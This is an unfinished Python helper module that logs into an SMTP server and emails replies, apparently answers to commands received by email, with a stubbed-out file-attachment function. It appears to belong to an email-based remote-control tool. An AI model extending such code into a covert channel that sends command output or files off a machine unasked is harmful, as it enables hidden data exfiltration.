import smtplib
from time import sleep
from email.message import EmailMessage
from email.mime.base import MIMEBase
import ssl

def sender_check(reciever_smtp_server, reciever_smtp_port, reciever_email, reciever_pass):
    try:
        smtp = smtplib.SMTP(reciever_smtp_server, reciever_smtp_port)
        smtp.ehlo()
        smtp.starttls()
        smtp.login(reciever_email, reciever_pass)
        print("SMTP login successful")
        return smtp
    except:
        print("Error, invalid credentials\n") #Program will end without proper credentials

def send_response(return_address, mako, cmdrsp, msg):
    rsp = EmailMessage()
    rsp['From'] = mako.reciever_email
    rsp['To'] = return_address
    rsp['Subject'] = cmdrsp #null this/hardcode
    rsp.set_content(msg)
    ssl_context = ssl.create_default_context() #recheck what this is for
    mako.smtp.sendmail(mako.reciever_email, return_address, rsp.as_string())
    sleep(1)

def send_image(return_address, mako, cmdrsp):
    rsp = EmailMessage()
    rsp['From'] = mako.reciever_email
    rsp['To'] = return_address
    rsp['Subject'] = cmdrsp #null this/hardcode
    #
    #filename = ''
    #attachment = open(filename, 'rb')
    #
    #part = MIMEBase('application', 'octet-stream')
    #part.set_payload(attachment.read())
    #rsp.attach(part)
    #mako.smtp.sendmail(mako.reciever_email, return_address, rsp.as_string())

# maybe combine with image?
def send_demo():
    pass